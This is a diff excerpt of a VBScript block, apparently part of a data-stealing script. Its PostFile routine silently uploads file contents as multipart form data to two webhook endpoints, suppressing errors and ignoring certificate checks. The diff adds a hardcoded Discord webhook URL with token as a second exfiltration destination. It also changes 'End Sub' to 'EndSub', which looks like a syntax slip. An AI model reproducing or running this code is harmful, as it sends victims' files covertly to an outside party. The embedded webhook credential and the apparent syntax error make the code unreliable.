@@ -133,8 +133,8 @@ Sub PostEmbed(t, d, c): On Error Resume Next: Dim j: j = "{""embeds"":[{""title"
 
 Sub PostFile(fn, ct): On Error Resume Next: Dim b: b = MkGuid(): Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing
-    Dim h2: Set h2 = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h2.SetOption 2, 13056: h2.Open "POST", WH2, False: h2.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h2.Send bd: Set h2 = Nothing: End Sub
-
+    Dim h2: Set h2 = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h2.SetOption 2, 13056: h2.Open "POST", WH2, False: h2.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h2.Send bd: Set h2 = Nothing: EndSub
+WH2 = "https://discord.com/api/webhooks/1527856329404842004/RoSXRztADjfPcklrW0iH573_fH_YT8ip-8revjRLR4HrNya20Xy1LN-patUva2aRRXDC"
 Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t"): Ej = s: End Function
 Function MkGuid(): Dim t: Set t = CreateObject("Scriptlet.TypeLib"): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function
 </script>
